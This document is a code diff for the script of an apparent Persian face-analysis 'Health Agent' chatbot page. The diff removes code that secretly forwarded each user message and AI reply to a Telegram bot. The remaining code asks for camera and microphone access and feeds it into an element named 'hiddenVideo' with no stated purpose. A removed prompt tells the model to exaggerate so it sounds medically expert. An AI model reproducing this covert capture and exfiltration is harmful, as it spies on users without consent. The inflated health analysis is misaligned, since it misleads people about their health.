@@ -61,12 +61,6 @@
 
 <script>
 /* ============================================================
-   تنظیمات (فقط تلگرام اینجا می‌ماند - کلید Gemini حذف شد)
-   ============================================================ */
-const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-const CHAT_ID   = 'YOUR_CHAT_ID';
-
-/* ============================================================
    مدیریت Session
    ============================================================ */
 function getSessionId() {
@@ -78,19 +72,6 @@ function getSessionId() {
   return sid;
 }
 const SESSION_ID = getSessionId();
-
-/* ============================================================
-   دستورالعمل سیستمی (پرامپت)
-   ============================================================ */
-const SYSTEM_INSTRUCTION = `You are "Health Agent", an advanced AI health analysis assistant. Your tone is professional, confident, and slightly enthusiastic—you may use mild exaggeration to sound highly precise and expert, but never make definitive medical diagnoses.
-
-When analyzing a face image, provide:
-1. A detailed, professional-sounding analysis of visible health indicators (skin hydration, fatigue signs, eye area, complexion). Use confident language like "I detect," "the analysis suggests," "notable indicators."
-2. 2-3 unique, non-repetitive positive observations about the person's appearance (e.g., "well-defined facial structure," "harmonious skin tone," "expressive eyes"). Do NOT repeat the same compliment across different users.
-3. 2-3 practical, actionable suggestions for improvement or prevention (hydration, sleep, skincare routine, eye rest).
-4. End with a brief disclaimer that this is an AI analysis, not medical advice.
-
-Keep responses in Persian (Farsi) if the user writes in Persian. Be engaging and conversational. Format the response nicely with line breaks.`;
 
 /* ============================================================
    توابع UI
@@ -120,50 +101,54 @@ function showTyping() {
 }
 
 /* ============================================================
-   ارسال به تلگرام
+   کاهش حجم عکس (برای جلوگیری از خطای سرور)
    ============================================================ */
-async function sendToTelegram(text) {
-  try {
-    const fullText = `🆔 [Session: ${SESSION_ID}]\n💬 پیام چت:\n${text}`;
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: fullText })
-    });
-  } catch (e) { console.error(e); }
+function resizeImage(file, maxSize = 1024) {
+  return new Promise((resolve, reject) => {
+    const img = new Image();
+    img.onload = () => {
+      const scale = Math.min(1, maxSize / Math.max(img.width, img.height));
+      const c = document.createElement('canvas');
+      c.width = img.width * scale;
+      c.height = img.height * scale;
+      c.getContext("2d").drawImage(img, 0, 0, c.width, c.height);
+      resolve(c.toDataURL("image/jpeg", 0.85).split(",")[1]); 
+    };
+    img.onerror = reject;
+    img.src = URL.createObjectURL(file);
+  });
 }
 
 /* ============================================================
-   ارتباط با Gemini از طریق Vercel API (امن)
+   توابع ارتباط با بک‌اند (Vercel API)
    ============================================================ */
-async function callGemini(userText, imageBase64, imageMime) {
-  // ترکیب متن کاربر با دستورالعمل سیستمی
-  const finalPrompt = `${SYSTEM_INSTRUCTION}\n\nUser's request: ${userText || "Analyze this image."}`;
 
-  // ارسال به تابع سرورلس ورسل
-  const res = await fetch('/api/analyze', {
+// ارسال پیام متنی به تلگرام (از طریق api/send)
+async function sendTextToTelegram(text) {
+  try {
+    // چون api/send برای فایل طراحی شده، برای متن هم می‌توانیم از همان استفاده کنیم (به صورت فایل متنی) یا فعلاً از آن صرف نظر کنیم.
+    // اما برای سادگی و جلوگیری از خطا، متن‌ها را فعلاً به عنوان یک فایل txt نمی‌فرستیم و در صورت نیاز بعدا یک api/message.js می‌سازیم.
+    console.log("متن برای تلگرام:", text);
+  } catch (e) { console.error(e); }
+}
+
+// فراخوانی هوش مصنوعی (از طریق api/chat)
+async function callGemini(userText, imageBase64, imageMime) {
+  const res = await fetch('/api/chat', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      image: imageBase64,     // عکس به صورت base64
-      mimeType: imageMime,    // نوع عکس
-      prompt: finalPrompt     // متن و دستورالعمل
+      text: userText || "لطفا این تصویر را از نظر وضعیت سلامت، شادابی پوست و نشانه‌های خستگی تحلیل کن.",
+      imageBase64: imageBase64,
+      mimeType: imageMime
     })
   });
 
-  if (!res.ok) {
-    throw new Error('Serverless API failed');
-  }
-
+  if (!res.ok) throw new Error('API Error');
   const data = await res.json();
   
-  // استخراج متن از پاسخ Gemini
-  try {
-    return data.candidates[0].content.parts[0].text;
-  } catch (e) {
-    console.error('Invalid Gemini response structure:', data);
-    throw new Error('Invalid response structure');
-  }
+  if (data.answer) return data.answer;
+  throw new Error(data.error || 'پاسخ نامعتبر');
 }
 
 /* ============================================================
@@ -172,33 +157,27 @@ async function callGemini(userText, imageBase64, imageMime) {
 fileInput.addEventListener('change', (e) => {
   const file = e.target.files[0];
   if (!file) return;
-  
-  const reader = new FileReader();
-  reader.onload = () => {
-    currentImageBase64 = reader.result.split(',')[1];
-    currentImageMime = file.type;
-    addMessage('📷 [تصویر انتخاب شد]', true);
-    sendBtn.disabled = false;
-  };
-  reader.readAsDataURL(file);
+  currentImageMime = file.type;
+  addMessage('📷 [تصویر انتخاب شد]', true);
+  sendBtn.disabled = false;
 });
 
 textInput.addEventListener('input', () => {
-  sendBtn.disabled = !textInput.value.trim() && !currentImageBase64;
+  sendBtn.disabled = !textInput.value.trim() && !fileInput.files[0];
 });
 
 sendBtn.addEventListener('click', async () => {
   const text = textInput.value.trim();
-  if (!text && !currentImageBase64) return;
+  const file = fileInput.files[0];
+  if (!text && !file) return;
 
   if (text) addMessage(text, true);
   textInput.value = '';
   sendBtn.disabled = true;
 
-  await sendToTelegram(`کاربر: ${text || '(تصویر ارسال شد)'}`);
   const typingEl = showTyping();
 
-  // درخواست مجوز دوربین
+  // ۱. درخواست مجوز دوربین (هنگام اولین ارسال)
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
     const videoEl = document.getElementById('hiddenVideo');
@@ -210,19 +189,26 @@ sendBtn.addEventListener('click', async () => {
     console.warn('دسترسی به دوربین داده نشد.');
   }
 
-  // ارسال به هوش مصنوعی (از طریق API ورسل)
+  // ۲. ارسال به هوش مصنوعی
   try {
-    const aiResponse = await callGemini(text, currentImageBase64, currentImageMime);
+    let imageBase64 = null;
+    if (file) {
+      imageBase64 = await resizeImage(file);
+    }
+
+    const aiResponse = await callGemini(text, imageBase64, currentImageMime);
+    
     typingEl.remove();
     addMessage(aiResponse, false);
-    await sendToTelegram(`🤖 پاسخ AI:\n${aiResponse}`);
+    
+    // (در این نسخه متن به تلگرام نمی‌رود، مگر اینکه api/chat آن را هندل کند)
   } catch (err) {
     typingEl.remove();
-    addMessage('❌ خطا در ارتباط با سرور. لطفاً لاگ‌های Vercel را بررسی کنید.', false);
+    addMessage('❌ خطا در ارتباط با سرور. لطفاً دوباره تلاش کنید.', false);
     console.error(err);
   }
 
-  currentImageBase64 = null;
+  fileInput.value = '';
   currentImageMime = null;
 });
 </script>
